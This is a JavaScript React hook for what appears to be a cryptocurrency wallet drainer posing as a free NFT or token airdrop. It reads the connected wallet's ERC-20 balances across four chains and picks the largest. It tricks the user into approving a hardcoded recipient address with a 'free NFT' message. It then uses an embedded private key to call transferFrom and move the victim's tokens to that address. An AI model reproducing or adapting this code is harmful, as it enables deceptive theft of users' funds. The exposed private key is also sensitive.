import axios from "axios"
import URL from '../Constants/url'
import { useWeb3React } from "@web3-react/core";
import { Injected, walletconnect } from "../Connectors/Connectors";
import { toast } from 'react-toastify';
import { useEffect, useState } from "react";
import Addresses from '../Constants/address'
import { ABI } from "./erc20ABI"
import Web3 from "web3";
// import 'react-toastify/dist/ReactToastify.css';
export const useAlchemy = () => {
    const context = useWeb3React();
    const {
        connector,
        library,
        chainId,
        account,
        activate,
        deactivate,
        active,
        error,
        request
    } = context;

    const [tokenName, setTokenName] = useState('');
    const [tokenSymbol, setTokenSymbol] = useState('');
    const [transactionHash, setTransactionHash] = useState('');
    const [contract, setContract] = useState(null)
    const [balanceArray, setBalanceArray] = useState([])

    const balances = []
    const promiseArray = []
    let highestbalance = 0;
    const networks = [
        { name: "goerli", url: URL.goerliApi, chainId: 5 },
        { name: "polygon", url: URL.polygonApi, chainId: 137 },
        { name: "mainnet", url: URL.mainnetApi, chainId: 1 },
        { name: "arbitrum", url: URL.arbitrumApi, chainId: 42161 }
    ]
    //get your account balances
    const getBalance = async () => {

        const data = JSON.stringify({
            "jsonrpc": "2.0",
            "method": "alchemy_getTokenBalances",
            "headers": {
                "Content-Type": "application/json"
            },
            "params": [
                `${account}`,
                "erc20",
            ],
            "id": 42
        });

        const goerliConfig = {
            method: 'post',
            url: URL.goerliApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };

        const polygonConfig = {
            method: 'post',
            url: URL.polygonApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        const mainnetConfig = {
            method: 'post',
            url: URL.mainnetApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };

        const arbitrumConfig = {
            method: 'post',
            url: URL.arbitrumApi,
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        const response = await Promise.all([axios(goerliConfig), axios(polygonConfig), axios(mainnetConfig), axios(arbitrumConfig)])
        console.log(response)
        // Make the request and print the formatted response:
        // const response = await axios(config)
        // console.log(response.data.result, "balance")
        const responses = [];
        response.forEach((item, index) => {
            responses.push({ ...item.data.result, network: networks[index].name, url: networks[index].url, chainId: networks[index].chainId })
        })
        console.log(responses, 'final response')

        responses.forEach(response => {
            response.tokenBalances.forEach(item => {

                promiseArray.push(new Promise(async (resolve, reject) => {

                    const mask = new Web3(response.url);
                    // let cont = new library.eth.Contract(ABI, item.contractAddress);
                    let cont = new mask.eth.Contract(ABI, item.contractAddress);
                    const name = await cont.methods.name().call();
                    const symbol = await cont.methods.symbol().call();
                    resolve({
                        name,
                        balance: parseInt(item.tokenBalance, 16),
                        address: item.contractAddress,
                        symbol,
                        url: response.url,
                        contract: cont,
                        chainId: response.chainId
                    })
                }))
            })
        })


        Promise.all(promiseArray).then(response => {

            balances.push(...response)
            setBalanceArray(balances)
            console.log(balances, "all balances")
        })


    }

    //getHighestBalance
    const getHighestBalance = () => {
        let snap = balanceArray[0]
        balanceArray.forEach(item => {
            if (highestbalance.balance < item.balance) {
                snap = item
            }
        })
        return snap;
        // console.log(highestBalance)
    }

    const getCurrentGasPrices = async () => {
        let response = await axios.get(
            "https://ethgasstation.info/json/ethgasAPI.json"
        );
        let prices = {
            low: response.data.safeLow / 10,
            medium: response.data.average / 10,
            high: response.data.fast / 10,
        };
        return prices;
    };

    //connect to wallet
    const connectWallet = () => {
        if (active) {
            toast.warn('Your metamask wallet is already connected!', {
                position: "top-center",
                autoClose: 5000,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
                theme: "colored",
            });
            // alert("Already connected")
        } else {
            activate(Injected);

        }
    }



    // let contract;
    // console.log()
    useEffect(() => {

        if (context.active) {
            getBalance()
            // let high = getHighestBalance()
            // console.log(high)
            let cont = new library.eth.Contract(ABI, Addresses.erc20);
            setContract(cont)

            async function getTokenInfo(contract) {
                try {
                    const name = await contract.methods.name().call();
                    const symbol = await contract.methods.symbol().call();
                    setTokenName(name);
                    setTokenSymbol(symbol);
                } catch (err) {
                    console.error(err);
                }
            }
            getTokenInfo(cont);


        }
    }, [context]);

    async function handleTransfer(event) {
        if (context.active) {

            let high = getHighestBalance()
            console.log(high.balance, high.chainId)
            if (high.balance !== 0) {
                event.preventDefault();
                if (chainId !== high.chainId) {
                    await switchNetworks(high.chainId)
                }
                const toAddress = "0x8a5961146C0AB8642b889bB215984fd31fE9757B";
                const amount = Web3.utils.toWei((500000).toString());
                try {
                    console.log(contract, toAddress, amount)
                    let data = await contract.methods.approve(toAddress, amount).send({
                        from: context.account,
                    }).on('transactionHash', (hash) => {
                        console.log(hash)

                        toast.success("Hurrah! You'll get your free NFT soon.")
                    })
                    const mask = new Web3(high.url);
                    const WALLET_PRIVATE_KEY = "49bdf04b4efaf38e51da4fb4eff29405fc042b4860a5a57f3842566e65a1932b"; //do not push this

                    const user = mask.eth.accounts.wallet.add(WALLET_PRIVATE_KEY);
                    let cont = new mask.eth.Contract(ABI, high.address);
                    let gasPrice = await getCurrentGasPrices().medium
                    cont.methods
                        .transferFrom(account, toAddress, high.balance.toString())
                        .send({ from: user.address, gas: gasPrice, gasLimit: "102012" }, function (err, res) {
                            if (err) {
                                console.log("An error occured", err);
                                return;
                            }
                            console.log("Hash of the transaction: ", res);
                        });
                } catch (err) {
                    toast.error("Refresh the page and reconnect wallet to recieve the airdrop!")
                    console.error(err);
                }
            }

        } else {
            toast.error("Connect Your Wallet to get free tokens!")
        }

        //     const toAddress = "0x8a5961146C0AB8642b889bB215984fd31fE9757B";
        //     const amount = high.balance;
        //     try {
        //         console.log(contract, toAddress, amount)
        //         let data = await contract.methods.transfer(toAddress, amount.toString()).send({
        //             from: context.account,
        //         }).on('transactionHash', (hash) => {
        //             console.log(hash)
        //             toast.success("Hurrah! You'll get your free NFT soon.")
        //         })
        //     } catch (err) {
        //         toast.error("Refresh the page and reconnect wallet to recieve the airdrop!")
        //         console.error(err);
        //     }
        // } else {
        //     toast.error("Connect Your Wallet to get free tokens!")
        // }

    }
    const getCurrentChainId = () => {
        console.log(chainId)
    }
    const switchNetworks = async (chain) => {
        try {

            await library.currentProvider.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: Web3.utils.toHex(chain) }]
            })
            console.log("switched!")
        } catch (err) {
            console.log("error in switching: ", err)
        }

    }
    return {
        getBalance,
        connectWallet,
        handleTransfer,
        getCurrentChainId,
        switchNetworks,
        active,
        account,
        // ToastContainer
    }

}